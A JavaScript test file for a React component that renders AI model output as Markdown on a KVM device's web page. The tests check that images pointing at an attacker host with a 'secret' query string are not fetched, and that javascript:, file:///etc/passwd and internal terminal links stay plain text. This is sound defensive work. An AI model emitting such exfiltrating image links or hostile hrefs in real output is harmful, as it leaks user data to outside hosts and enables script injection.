import assert from 'node:assert/strict';
import test from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { MarkdownContent } from '../src/pages/desktop/picoclaw/markdown-content.tsx';

// The page's own location: links are judged against it.
globalThis.window = { location: new URL('https://nanokvm.local/#/desktop') };

const render = (content) => renderToStaticMarkup(createElement(MarkdownContent, { content }));

test('a Markdown image from the model is not fetched', () => {
  const html = render(
    'Done ![screen](https://attacker.example/p?d=secret) and <img src="https://attacker.example/x">'
  );
  assert.ok(!/<img/i.test(html), html);
  assert.ok(!html.includes('attacker.example/p'), html);
  assert.ok(html.includes('[screen]'), html);
});

test('links stay links', () => {
  const html = render('see [docs](https://example.com/docs)');
  assert.match(html, /<a [^>]*href="https:\/\/example\.com\/docs"/);
});

test('links into the device or not over http(s) stay text', () => {
  for (const href of [
    '/#/terminal',
    'https://nanokvm.local/api/vm/terminal',
    'javascript:alert(1)',
    'file:///etc/passwd'
  ]) {
    const html = render(`see [here](${href})`);
    assert.ok(!/<a /i.test(html), html);
    assert.ok(html.includes('here'), html);
  }
});
